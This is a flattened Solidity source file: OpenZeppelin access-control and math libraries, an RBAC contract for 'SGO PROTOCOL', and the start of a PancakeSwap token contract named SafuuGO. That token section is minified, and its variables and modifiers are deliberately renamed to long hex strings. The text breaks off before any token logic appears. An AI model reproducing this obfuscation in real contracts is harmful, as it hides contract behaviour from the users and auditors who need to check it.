// Sources flattened with hardhat v2.13.1 https://hardhat.org

// File @openzeppelin/contracts/access/IAccessControl.sol@v4.8.3

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (access/IAccessControl.sol)

pragma solidity ^0.8.0;

/**
 * @dev External interface of AccessControl declared to support ERC165 detection.
 */
interface IAccessControl {
    /**
     * @dev Emitted when `newAdminRole` is set as ``role``'s admin role, replacing `previousAdminRole`
     *
     * `DEFAULT_ADMIN_ROLE` is the starting admin for all roles, despite
     * {RoleAdminChanged} not being emitted signaling this.
     *
     * _Available since v3.1._
     */
    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);

    /**
     * @dev Emitted when `account` is granted `role`.
     *
     * `sender` is the account that originated the contract call, an admin role
     * bearer except when using {AccessControl-_setupRole}.
     */
    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);

    /**
     * @dev Emitted when `account` is revoked `role`.
     *
     * `sender` is the account that originated the contract call:
     *   - if using `revokeRole`, it is the admin role bearer
     *   - if using `renounceRole`, it is the role bearer (i.e. `account`)
     */
    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);

    /**
     * @dev Returns `true` if `account` has been granted `role`.
     */
    function hasRole(bytes32 role, address account) external view returns (bool);

    /**
     * @dev Returns the admin role that controls `role`. See {grantRole} and
     * {revokeRole}.
     *
     * To change a role's admin, use {AccessControl-_setRoleAdmin}.
     */
    function getRoleAdmin(bytes32 role) external view returns (bytes32);

    /**
     * @dev Grants `role` to `account`.
     *
     * If `account` had not been already granted `role`, emits a {RoleGranted}
     * event.
     *
     * Requirements:
     *
     * - the caller must have ``role``'s admin role.
     */
    function grantRole(bytes32 role, address account) external;

    /**
     * @dev Revokes `role` from `account`.
     *
     * If `account` had been granted `role`, emits a {RoleRevoked} event.
     *
     * Requirements:
     *
     * - the caller must have ``role``'s admin role.
     */
    function revokeRole(bytes32 role, address account) external;

    /**
     * @dev Revokes `role` from the calling account.
     *
     * Roles are often managed via {grantRole} and {revokeRole}: this function's
     * purpose is to provide a mechanism for accounts to lose their privileges
     * if they are compromised (such as when a trusted device is misplaced).
     *
     * If the calling account had been granted `role`, emits a {RoleRevoked}
     * event.
     *
     * Requirements:
     *
     * - the caller must be `account`.
     */
    function renounceRole(bytes32 role, address account) external;
}


// File @openzeppelin/contracts/utils/Context.sol@v4.8.3


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.8.3


// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC165 standard, as defined in the
 * https://eips.ethereum.org/EIPS/eip-165[EIP].
 *
 * Implementers can declare support of contract interfaces, which can then be
 * queried by others ({ERC165Checker}).
 *
 * For an implementation, see {ERC165}.
 */
interface IERC165 {
    /**
     * @dev Returns true if this contract implements the interface defined by
     * `interfaceId`. See the corresponding
     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
     * to learn more about how these ids are created.
     *
     * This function call must use less than 30 000 gas.
     */
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}


// File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.8.3


// OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)

pragma solidity ^0.8.0;

/**
 * @dev Implementation of the {IERC165} interface.
 *
 * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
 * for the additional interface id that will be supported. For example:
 *
 * ```solidity
 * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
 *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
 * }
 * ```
 *
 * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
 */
abstract contract ERC165 is IERC165 {
    /**
     * @dev See {IERC165-supportsInterface}.
     */
    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IERC165).interfaceId;
    }
}


// File @openzeppelin/contracts/utils/math/Math.sol@v4.8.3


// OpenZeppelin Contracts (last updated v4.8.0) (utils/math/Math.sol)

pragma solidity ^0.8.0;

/**
 * @dev Standard math utilities missing in the Solidity language.
 */
library Math {
    enum Rounding {
        Down, // Toward negative infinity
        Up, // Toward infinity
        Zero // Toward zero
    }

    /**
     * @dev Returns the largest of two numbers.
     */
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a : b;
    }

    /**
     * @dev Returns the smallest of two numbers.
     */
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    /**
     * @dev Returns the average of two numbers. The result is rounded towards
     * zero.
     */
    function average(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b) / 2 can overflow.
        return (a & b) + (a ^ b) / 2;
    }

    /**
     * @dev Returns the ceiling of the division of two numbers.
     *
     * This differs from standard division with `/` in that it rounds up instead
     * of rounding down.
     */
    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b - 1) / b can overflow on addition, so we distribute.
        return a == 0 ? 0 : (a - 1) / b + 1;
    }

    /**
     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0
     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)
     * with further edits by Uniswap Labs also under MIT license.
     */
    function mulDiv(
        uint256 x,
        uint256 y,
        uint256 denominator
    ) internal pure returns (uint256 result) {
        unchecked {
            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use
            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256
            // variables such that product = prod1 * 2^256 + prod0.
            uint256 prod0; // Least significant 256 bits of the product
            uint256 prod1; // Most significant 256 bits of the product
            assembly {
                let mm := mulmod(x, y, not(0))
                prod0 := mul(x, y)
                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
            }

            // Handle non-overflow cases, 256 by 256 division.
            if (prod1 == 0) {
                return prod0 / denominator;
            }

            // Make sure the result is less than 2^256. Also prevents denominator == 0.
            require(denominator > prod1);

            ///////////////////////////////////////////////
            // 512 by 256 division.
            ///////////////////////////////////////////////

            // Make division exact by subtracting the remainder from [prod1 prod0].
            uint256 remainder;
            assembly {
                // Compute remainder using mulmod.
                remainder := mulmod(x, y, denominator)

                // Subtract 256 bit number from 512 bit number.
                prod1 := sub(prod1, gt(remainder, prod0))
                prod0 := sub(prod0, remainder)
            }

            // Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always >= 1.
            // See https://cs.stackexchange.com/q/138556/92363.

            // Does not overflow because the denominator cannot be zero at this stage in the function.
            uint256 twos = denominator & (~denominator + 1);
            assembly {
                // Divide denominator by twos.
                denominator := div(denominator, twos)

                // Divide [prod1 prod0] by twos.
                prod0 := div(prod0, twos)

                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.
                twos := add(div(sub(0, twos), twos), 1)
            }

            // Shift in bits from prod1 into prod0.
            prod0 |= prod1 * twos;

            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such
            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for
            // four bits. That is, denominator * inv = 1 mod 2^4.
            uint256 inverse = (3 * denominator) ^ 2;

            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also works
            // in modular arithmetic, doubling the correct bits in each step.
            inverse *= 2 - denominator * inverse; // inverse mod 2^8
            inverse *= 2 - denominator * inverse; // inverse mod 2^16
            inverse *= 2 - denominator * inverse; // inverse mod 2^32
            inverse *= 2 - denominator * inverse; // inverse mod 2^64
            inverse *= 2 - denominator * inverse; // inverse mod 2^128
            inverse *= 2 - denominator * inverse; // inverse mod 2^256

            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.
            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is
            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1
            // is no longer required.
            result = prod0 * inverse;
            return result;
        }
    }

    /**
     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.
     */
    function mulDiv(
        uint256 x,
        uint256 y,
        uint256 denominator,
        Rounding rounding
    ) internal pure returns (uint256) {
        uint256 result = mulDiv(x, y, denominator);
        if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {
            result += 1;
        }
        return result;
    }

    /**
     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded down.
     *
     * Inspired by Henry S. Warren, Jr.'s "Hacker's Delight" (Chapter 11).
     */
    function sqrt(uint256 a) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.
        //
        // We know that the "msb" (most significant bit) of our target number `a` is a power of 2 such that we have
        // `msb(a) <= a < 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.
        //
        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`
        // → `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`
        // → `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`
        //
        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.
        uint256 result = 1 << (log2(a) >> 1);

        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,
        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at
        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision
        // into the expected uint128 result.
        unchecked {
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            result = (result + a / result) >> 1;
            return min(result, a / result);
        }
    }

    /**
     * @notice Calculates sqrt(a), following the selected rounding direction.
     */
    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = sqrt(a);
            return result + (rounding == Rounding.Up && result * result < a ? 1 : 0);
        }
    }

    /**
     * @dev Return the log in base 2, rounded down, of a positive value.
     * Returns 0 if given 0.
     */
    function log2(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >> 128 > 0) {
                value >>= 128;
                result += 128;
            }
            if (value >> 64 > 0) {
                value >>= 64;
                result += 64;
            }
            if (value >> 32 > 0) {
                value >>= 32;
                result += 32;
            }
            if (value >> 16 > 0) {
                value >>= 16;
                result += 16;
            }
            if (value >> 8 > 0) {
                value >>= 8;
                result += 8;
            }
            if (value >> 4 > 0) {
                value >>= 4;
                result += 4;
            }
            if (value >> 2 > 0) {
                value >>= 2;
                result += 2;
            }
            if (value >> 1 > 0) {
                result += 1;
            }
        }
        return result;
    }

    /**
     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.
     * Returns 0 if given 0.
     */
    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = log2(value);
            return result + (rounding == Rounding.Up && 1 << result < value ? 1 : 0);
        }
    }

    /**
     * @dev Return the log in base 10, rounded down, of a positive value.
     * Returns 0 if given 0.
     */
    function log10(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >= 10**64) {
                value /= 10**64;
                result += 64;
            }
            if (value >= 10**32) {
                value /= 10**32;
                result += 32;
            }
            if (value >= 10**16) {
                value /= 10**16;
                result += 16;
            }
            if (value >= 10**8) {
                value /= 10**8;
                result += 8;
            }
            if (value >= 10**4) {
                value /= 10**4;
                result += 4;
            }
            if (value >= 10**2) {
                value /= 10**2;
                result += 2;
            }
            if (value >= 10**1) {
                result += 1;
            }
        }
        return result;
    }

    /**
     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.
     * Returns 0 if given 0.
     */
    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = log10(value);
            return result + (rounding == Rounding.Up && 10**result < value ? 1 : 0);
        }
    }

    /**
     * @dev Return the log in base 256, rounded down, of a positive value.
     * Returns 0 if given 0.
     *
     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.
     */
    function log256(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        unchecked {
            if (value >> 128 > 0) {
                value >>= 128;
                result += 16;
            }
            if (value >> 64 > 0) {
                value >>= 64;
                result += 8;
            }
            if (value >> 32 > 0) {
                value >>= 32;
                result += 4;
            }
            if (value >> 16 > 0) {
                value >>= 16;
                result += 2;
            }
            if (value >> 8 > 0) {
                result += 1;
            }
        }
        return result;
    }

    /**
     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.
     * Returns 0 if given 0.
     */
    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {
        unchecked {
            uint256 result = log256(value);
            return result + (rounding == Rounding.Up && 1 << (result * 8) < value ? 1 : 0);
        }
    }
}


// File @openzeppelin/contracts/utils/Strings.sol@v4.8.3


// OpenZeppelin Contracts (last updated v4.8.0) (utils/Strings.sol)

pragma solidity ^0.8.0;

/**
 * @dev String operations.
 */
library Strings {
    bytes16 private constant _SYMBOLS = "0123456789abcdef";
    uint8 private constant _ADDRESS_LENGTH = 20;

    /**
     * @dev Converts a `uint256` to its ASCII `string` decimal representation.
     */
    function toString(uint256 value) internal pure returns (string memory) {
        unchecked {
            uint256 length = Math.log10(value) + 1;
            string memory buffer = new string(length);
            uint256 ptr;
            /// @solidity memory-safe-assembly
            assembly {
                ptr := add(buffer, add(32, length))
            }
            while (true) {
                ptr--;
                /// @solidity memory-safe-assembly
                assembly {
                    mstore8(ptr, byte(mod(value, 10), _SYMBOLS))
                }
                value /= 10;
                if (value == 0) break;
            }
            return buffer;
        }
    }

    /**
     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
     */
    function toHexString(uint256 value) internal pure returns (string memory) {
        unchecked {
            return toHexString(value, Math.log256(value) + 1);
        }
    }

    /**
     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
     */
    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }

    /**
     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation.
     */
    function toHexString(address addr) internal pure returns (string memory) {
        return toHexString(uint256(uint160(addr)), _ADDRESS_LENGTH);
    }
}


// File @openzeppelin/contracts/access/AccessControl.sol@v4.8.3


// OpenZeppelin Contracts (last updated v4.8.0) (access/AccessControl.sol)

pragma solidity ^0.8.0;




/**
 * @dev Contract module that allows children to implement role-based access
 * control mechanisms. This is a lightweight version that doesn't allow enumerating role
 * members except through off-chain means by accessing the contract event logs. Some
 * applications may benefit from on-chain enumerability, for those cases see
 * {AccessControlEnumerable}.
 *
 * Roles are referred to by their `bytes32` identifier. These should be exposed
 * in the external API and be unique. The best way to achieve this is by
 * using `public constant` hash digests:
 *
 * ```
 * bytes32 public constant MY_ROLE = keccak256("MY_ROLE");
 * ```
 *
 * Roles can be used to represent a set of permissions. To restrict access to a
 * function call, use {hasRole}:
 *
 * ```
 * function foo() public {
 *     require(hasRole(MY_ROLE, msg.sender));
 *     ...
 * }
 * ```
 *
 * Roles can be granted and revoked dynamically via the {grantRole} and
 * {revokeRole} functions. Each role has an associated admin role, and only
 * accounts that have a role's admin role can call {grantRole} and {revokeRole}.
 *
 * By default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`, which means
 * that only accounts with this role will be able to grant or revoke other
 * roles. More complex role relationships can be created by using
 * {_setRoleAdmin}.
 *
 * WARNING: The `DEFAULT_ADMIN_ROLE` is also its own admin: it has permission to
 * grant and revoke this role. Extra precautions should be taken to secure
 * accounts that have been granted it.
 */
abstract contract AccessControl is Context, IAccessControl, ERC165 {
    struct RoleData {
        mapping(address => bool) members;
        bytes32 adminRole;
    }

    mapping(bytes32 => RoleData) private _roles;

    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;

    /**
     * @dev Modifier that checks that an account has a specific role. Reverts
     * with a standardized message including the required role.
     *
     * The format of the revert reason is given by the following regular expression:
     *
     *  /^AccessControl: account (0x[0-9a-f]{40}) is missing role (0x[0-9a-f]{64})$/
     *
     * _Available since v4.1._
     */
    modifier onlyRole(bytes32 role) {
        _checkRole(role);
        _;
    }

    /**
     * @dev See {IERC165-supportsInterface}.
     */
    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IAccessControl).interfaceId || super.supportsInterface(interfaceId);
    }

    /**
     * @dev Returns `true` if `account` has been granted `role`.
     */
    function hasRole(bytes32 role, address account) public view virtual override returns (bool) {
        return _roles[role].members[account];
    }

    /**
     * @dev Revert with a standard message if `_msgSender()` is missing `role`.
     * Overriding this function changes the behavior of the {onlyRole} modifier.
     *
     * Format of the revert message is described in {_checkRole}.
     *
     * _Available since v4.6._
     */
    function _checkRole(bytes32 role) internal view virtual {
        _checkRole(role, _msgSender());
    }

    /**
     * @dev Revert with a standard message if `account` is missing `role`.
     *
     * The format of the revert reason is given by the following regular expression:
     *
     *  /^AccessControl: account (0x[0-9a-f]{40}) is missing role (0x[0-9a-f]{64})$/
     */
    function _checkRole(bytes32 role, address account) internal view virtual {
        if (!hasRole(role, account)) {
            revert(
                string(
                    abi.encodePacked(
                        "AccessControl: account ",
                        Strings.toHexString(account),
                        " is missing role ",
                        Strings.toHexString(uint256(role), 32)
                    )
                )
            );
        }
    }

    /**
     * @dev Returns the admin role that controls `role`. See {grantRole} and
     * {revokeRole}.
     *
     * To change a role's admin, use {_setRoleAdmin}.
     */
    function getRoleAdmin(bytes32 role) public view virtual override returns (bytes32) {
        return _roles[role].adminRole;
    }

    /**
     * @dev Grants `role` to `account`.
     *
     * If `account` had not been already granted `role`, emits a {RoleGranted}
     * event.
     *
     * Requirements:
     *
     * - the caller must have ``role``'s admin role.
     *
     * May emit a {RoleGranted} event.
     */
    function grantRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
        _grantRole(role, account);
    }

    /**
     * @dev Revokes `role` from `account`.
     *
     * If `account` had been granted `role`, emits a {RoleRevoked} event.
     *
     * Requirements:
     *
     * - the caller must have ``role``'s admin role.
     *
     * May emit a {RoleRevoked} event.
     */
    function revokeRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
        _revokeRole(role, account);
    }

    /**
     * @dev Revokes `role` from the calling account.
     *
     * Roles are often managed via {grantRole} and {revokeRole}: this function's
     * purpose is to provide a mechanism for accounts to lose their privileges
     * if they are compromised (such as when a trusted device is misplaced).
     *
     * If the calling account had been revoked `role`, emits a {RoleRevoked}
     * event.
     *
     * Requirements:
     *
     * - the caller must be `account`.
     *
     * May emit a {RoleRevoked} event.
     */
    function renounceRole(bytes32 role, address account) public virtual override {
        require(account == _msgSender(), "AccessControl: can only renounce roles for self");

        _revokeRole(role, account);
    }

    /**
     * @dev Grants `role` to `account`.
     *
     * If `account` had not been already granted `role`, emits a {RoleGranted}
     * event. Note that unlike {grantRole}, this function doesn't perform any
     * checks on the calling account.
     *
     * May emit a {RoleGranted} event.
     *
     * [WARNING]
     * ====
     * This function should only be called from the constructor when setting
     * up the initial roles for the system.
     *
     * Using this function in any other way is effectively circumventing the admin
     * system imposed by {AccessControl}.
     * ====
     *
     * NOTE: This function is deprecated in favor of {_grantRole}.
     */
    function _setupRole(bytes32 role, address account) internal virtual {
        _grantRole(role, account);
    }

    /**
     * @dev Sets `adminRole` as ``role``'s admin role.
     *
     * Emits a {RoleAdminChanged} event.
     */
    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {
        bytes32 previousAdminRole = getRoleAdmin(role);
        _roles[role].adminRole = adminRole;
        emit RoleAdminChanged(role, previousAdminRole, adminRole);
    }

    /**
     * @dev Grants `role` to `account`.
     *
     * Internal function without access restriction.
     *
     * May emit a {RoleGranted} event.
     */
    function _grantRole(bytes32 role, address account) internal virtual {
        if (!hasRole(role, account)) {
            _roles[role].members[account] = true;
            emit RoleGranted(role, account, _msgSender());
        }
    }

    /**
     * @dev Revokes `role` from `account`.
     *
     * Internal function without access restriction.
     *
     * May emit a {RoleRevoked} event.
     */
    function _revokeRole(bytes32 role, address account) internal virtual {
        if (hasRole(role, account)) {
            _roles[role].members[account] = false;
            emit RoleRevoked(role, account, _msgSender());
        }
    }
}


// File @chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol@v0.6.1


pragma solidity ^0.8.0;

interface AggregatorV3Interface {
  function decimals() external view returns (uint8);

  function description() external view returns (string memory);

  function version() external view returns (uint256);

  function getRoundData(uint80 _roundId)
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );

  function latestRoundData()
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );
}


// File contracts/RBAC.sol


//
// RBAC for use with SGO PROTOCOL COPYRIGHT (C) 2023
pragma solidity ^0.8.17;

contract RBAC is AccessControl {
  bytes32 public constant AI_ROLE = keccak256("AI");
  bytes32 public constant AGENT_ROLE = keccak256("AGENT");
  bytes32 public constant ANALYST_ROLE = keccak256("ANALYST");
  bytes32 public constant PAIRPARTNER_ROLE = keccak256("PAIRPARTNER");
  bytes32 public constant COMMUNITY_ROLE = keccak256("COMMUNITY");

  constructor (address root) {
    // NOTE: Other DEFAULT_ADMIN's can remove other admins, give this role with great care
    _setupRole(DEFAULT_ADMIN_ROLE, root); // The creator of the contract is the default admin

    // SETUP role Hierarchy:
    // DEFAULT_ADMIN_ROLE > AGENT > AI_ROLE > ANALYST_ROLE > PAIRPARTNER > COMMUNITY_ROLE > no role
    _setRoleAdmin(AGENT_ROLE, DEFAULT_ADMIN_ROLE);
    _setRoleAdmin(AI_ROLE, AGENT_ROLE);
    _setRoleAdmin(ANALYST_ROLE, AI_ROLE);
    _setRoleAdmin(PAIRPARTNER_ROLE, ANALYST_ROLE);
    _setRoleAdmin(COMMUNITY_ROLE, PAIRPARTNER_ROLE);
  }

  // Create a bool check to see if a account address has the role admin
  function isAdmin(address account) public virtual view returns(bool)
  {
    return hasRole(DEFAULT_ADMIN_ROLE, account);
  }


  function isAI(address account) public virtual view returns(bool)
  {
    return hasRole(AI_ROLE, account);
  }

  function isAgent(address account) public virtual view returns(bool)
  {
    return hasRole(AGENT_ROLE, account);
  }

  
  function isAnalyst(address account) public virtual view returns(bool)
  {
    return hasRole(ANALYST_ROLE, account);
  }


  function isPairPartner(address account) public virtual view returns(bool)
  {
    return hasRole(PAIRPARTNER_ROLE, account);
  }


  function isCommunity(address account) public virtual view returns(bool)
  {
    return hasRole(COMMUNITY_ROLE, account);
  }

  // Create a modifier that can be used in other contract to make a pre-check
  // That makes sure that the sender of the transaction (msg.sender)  is a admin
  modifier onlyAdmin() {
    require(isAdmin(msg.sender), "Admin");
      _;
  }

  modifier onlyAgent() {
    require(isAgent(msg.sender), "Agent");
      _;
  }

  modifier onlyAI() {
    require(isAI(msg.sender), "AI");
      _;
  }


  modifier onlyAnalyst() {
    require(isAnalyst(msg.sender), "Analyst");
      _;
  }

  modifier onlyPairPartner() {
    require(isPairPartner(msg.sender), "Partner");
      _;
  }


  modifier onlyCommunity() {
    require(isCommunity(msg.sender), "Community");
      _;
  }

  // Add a user address as a admin
  function addAdmin(address account) public virtual onlyAdmin
  {
    grantRole(DEFAULT_ADMIN_ROLE, account);
  }

  function addAgent(address account) external virtual onlyAdmin
  {
    grantRole(AGENT_ROLE, account);
  }


  function addAI(address account) external virtual onlyAdmin
  {
    grantRole(AI_ROLE, account);
  }


  function addAnalyst(address account) external virtual onlyAdmin
  {
    grantRole(ANALYST_ROLE, account);
  }


  function addPairPartner(address account) external virtual onlyAdmin
  {
    grantRole(PAIRPARTNER_ROLE, account);
  }


  function addCommunity(address account) external virtual onlyAdmin
  {
    grantRole(COMMUNITY_ROLE, account);
  }

  // Hand over contract - clean - no strings
  function renounceAdmin(address account) public virtual onlyAdmin
  {
    //revokeRole(AI_ROLE, account);
    renounceRole(DEFAULT_ADMIN_ROLE, account);
  }
}


// File contracts/Enigma/SafuuGO.sol


// SGO PROTOCOL COPYRIGHT (C) 2023
// x86171d7aa39d175a1999233e2c03271c31f96aca0ae50e09a4656d75
pragma solidity 0.8.17;interface IERC20 {function totalSupply() external view returns (uint256);function balanceOf(address who) external view returns (uint256);function allowance(address owner, address spender)external view returns (uint256);function transfer(address to, uint256 value) external returns (bool);function approve(address spender, uint256 value) external returns (bool);function transferFrom(address from,address to,uint256 value) external returns (bool);event Transfer(address indexed from, address indexed to, uint256 value);event Approval(address indexed owner,address indexed spender,uint256 value);}interface IPancakeSwapPair {event Approval(address indexed owner, address indexed spender, uint value);event Transfer(address indexed from, address indexed to, uint value);function name() external pure returns (string memory);function symbol() external pure returns (string memory);function decimals() external pure returns (uint8);function totalSupply() external view returns (uint);function balanceOf(address owner) external view returns (uint);function allowance(address owner, address spender) external view returns (uint);function approve(address spender, uint value) external returns (bool);function transfer(address to, uint value) external returns (bool);function transferFrom(address from, address to, uint value) external returns (bool);function DOMAIN_SEPARATOR() external view returns (bytes32);function PERMIT_TYPEHASH() external pure returns (bytes32);function nonces(address owner) external view returns (uint);function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;event Mint(address indexed sender, uint amount0, uint amount1);event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);event Swap(address indexed sender,uint amount0In,uint amount1In,uint amount0Out,uint amount1Out,address indexed to);event Sync(uint112 reserve0, uint112 reserve1);function MINIMUM_LIQUIDITY() external pure returns (uint);function factory() external view returns (address);function token0() external view returns (address);function token1() external view returns (address);function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);function price0CumulativeLast() external view returns (uint);function price1CumulativeLast() external view returns (uint);function kLast() external view returns (uint);function mint(address to) external returns (uint liquidity);function burn(address to) external returns (uint amount0, uint amount1);function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;function skim(address to) external;function sync() external;function initialize(address, address) external;}interface IPancakeSwapRouter{function factory() external pure returns (address);function WETH() external pure returns (address);function swapExactTokensForTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external returns (uint[] memory amounts);function swapTokensForExactTokens(uint amountOut,uint amountInMax,address[] calldata path,address to,uint deadline) external returns (uint[] memory amounts);function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)external payable returns (uint[] memory amounts);function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)external returns (uint[] memory amounts);function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)external returns (uint[] memory amounts);function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)external payable returns (uint[] memory amounts);function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin,address[] calldata path,address to,uint deadline) external payable;function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;}interface IPancakeSwapFactory {event PairCreated(address indexed token0, address indexed token1, address pair, uint);function feeTo() external view returns (address);function feeToSetter() external view returns (address);function getPair(address tokenA, address tokenB) external view returns (address pair);function allPairs(uint) external view returns (address pair);function allPairsLength() external view returns (uint);function createPair(address tokenA, address tokenB) external returns (address pair);function setFeeTo(address) external;function setFeeToSetter(address) external;}abstract contract ERC20Detailed is IERC20 {string private _name;string private _symbol;uint8 private _decimals;constructor(string memory name_,string memory symbol_,uint8 decimals_) {_name = name_;_symbol = symbol_;_decimals = decimals_;}function name() public view returns (string memory) {return _name;}function symbol() public view returns (string memory) {return _symbol;}function decimals() public view returns (uint8) {return _decimals;}}contract SafuuGO is ERC20Detailed, RBAC {string public _name = "SGO";string public _symbol = "SGO";uint8 public _decimals = 18;IPancakeSwapPair public Oxf40c8b8eb4c8f9ba62daf8fae92b1a85e1c1fc94b0c0e03f6c98efe8a5b4372fc46193c9469304848bb09508908ce295f0ea1ca254052654ab997335ded7c827;mapping(address => bool) Oxf7980711b86977ba5e8d654647570bbd8c8d15c69b771871955c099a0adc23068683ae241fb17e5fe7fb7dd012faba896de9d52d469d66743a7d90b26aade0e7;modifier Ox9789e904b4e0c604f6e1074ca7800594b43f78036bc64298c6907054ae869686cc48030e118247b6c0bae6c039cafc5297b17742ad3dff942c7336a89026189b(address to) {require(to != address(0x0));_;}uint256 public 